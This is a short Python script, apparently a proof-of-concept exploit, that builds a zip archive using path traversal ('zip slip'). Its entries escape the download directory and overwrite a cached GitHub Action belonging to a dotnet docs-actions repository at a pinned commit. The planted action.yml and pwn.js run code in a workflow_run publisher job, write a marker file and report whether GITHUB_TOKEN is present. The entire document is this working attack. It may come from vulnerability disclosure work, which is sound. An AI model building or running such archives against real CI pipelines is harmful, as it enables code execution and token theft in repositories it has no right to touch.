import zipfile

ACTION_YML = """name: 'PWNED'
runs:
  using: 'node20'
  main: 'pwn.js'
"""

PWN_JS = """const fs = require('fs');
fs.writeFileSync('/home/runner/work/pwned-rce.txt', 'RCE in workflow_run publisher job\\n');
console.log('PWNED_ACTION_EXECUTED');
console.log('GITHUB_TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
console.log('GITHUB_REPOSITORY=' + process.env.GITHUB_REPOSITORY);
"""

base = '../../_actions/dotnet/docs-actions/e92e67a4b93ea5976eea3d65af4b2082818c7045'
entries = {
    'report.json': b'{"poc":true}',
    '../../zip-slip-proof.txt': b'zip-slip escaped the download directory\n',
    base + '/ops-build-reporter/dist/publish/index.js': PWN_JS.encode(),
    base + '/ops-build-reporter/publish/action.yml': ACTION_YML.encode(),
    base + '/ops-build-reporter/publish/pwn.js': PWN_JS.encode(),
    base + '.completed': b'',
}
with zipfile.ZipFile('/tmp/ops-build-report.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    for name, data in entries.items():
        z.writestr(name, data)
print('zip built with entries:', list(entries))
